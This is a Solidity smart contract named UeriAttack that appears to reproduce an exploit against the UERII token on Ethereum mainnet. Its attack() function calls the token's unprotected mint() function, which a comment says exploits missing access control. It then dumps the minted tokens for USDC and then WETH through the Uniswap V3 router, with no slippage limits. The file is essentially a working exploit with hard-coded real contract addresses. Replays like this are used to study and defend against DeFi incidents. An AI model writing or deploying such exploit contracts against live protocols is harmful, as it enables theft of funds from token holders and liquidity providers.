// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IUERII is IERC20 {
    function mint() external;
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    struct ExactOutputParams {
        bytes path;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
    }

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to
    ) external payable returns (uint256 amountOut);

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);

    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}

contract UeriAttack {
    IUERII constant UERII_TOKEN = IUERII(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
    IERC20 constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 constant UNI_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // This function is called to carry out the attack.
    function attack() external {
        // Actual payload exploiting the missing access control
        UERII_TOKEN.mint();

        // Exchanging the newly minted UERII for USDC
        UERII_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _UERIIToUSDC();

        // Exchanging all USDC for WETH
        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _USDCToWETH();
    }

    /**
     * Auxiliary function to swap all UERII to USDC
     */
    function _UERIIToUSDC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(UERII_TOKEN),
            tokenOut: address(USDC_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: UERII_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UNI_ROUTER.exactInputSingle(_Params);
    }

    /**
     * Auxiliary function to swap all USDC to WETH
     */
    function _USDCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC_TOKEN),
            tokenOut: address(WETH_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UNI_ROUTER.exactInputSingle(_Params);
    }
}
